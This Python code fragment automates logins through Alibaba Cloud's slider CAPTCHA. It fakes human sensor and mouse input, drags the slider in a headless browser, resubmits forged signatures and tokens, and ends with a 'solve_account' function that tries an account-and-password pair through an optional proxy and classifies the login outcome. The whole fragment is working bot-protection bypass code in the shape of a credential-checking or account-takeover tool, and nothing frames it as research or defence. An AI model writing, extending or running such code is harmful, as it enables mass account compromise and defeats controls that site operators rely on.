            self._prefetched = None
        if result is None:
            result = self._try_post(payload)
        if not looks_real_json(result):
            for _rn in range(3):
                body = result or ''
                if 'aliyuncaptcha' in body.lower() or 'captcha' in body.lower():
                    break
                time.sleep(0.8 + random.random() * 0.7)
                result = self._try_post(payload)
                if looks_real_json(result):
                    return result
        if looks_real_json(result):
            return result
        self.last_challenge = result
        self._sensor_feel(light=True)
        for cycle in range(retries):
            self.certify_ids = []
            self.real_json = []
            self._submit_asig = None
            self._submit_token = None
            html = _rewrite_challenge(self.last_challenge)
            try:
                self.page.set_content(html, wait_until='domcontentloaded',
                                      timeout=700)
            except Exception:
                pass
            has_slider = self._wait_slider()
            if has_slider:
                self._click_around(_PARAM_VARIANTS[_DRAG_VARIANT]['pre_clicks'])
                self.drag_slider(payload=payload)
            if self.real_json:
                return self.real_json[-1]
            if self.certify_ids or self._submit_asig:
                result = self._native_submit(payload)
                if looks_real_json(result):
                    return result
            self._reset_challenge()
            if cycle < retries - 1:
                result = self._try_post(payload)
                self.last_challenge = result
        return result


def solve_account(account, password, proxy=None, transport='chromium',
                  headless=True):
    sess = SolverSession(proxy=proxy, transport=transport, headless=headless)
    try:
        sess.start()
        payload = gen_payload(account, password)
        raw = sess.solve_login(payload)
        return classify_login(None, raw)
    finally:
        try:
            sess.close()
        except Exception:
            pass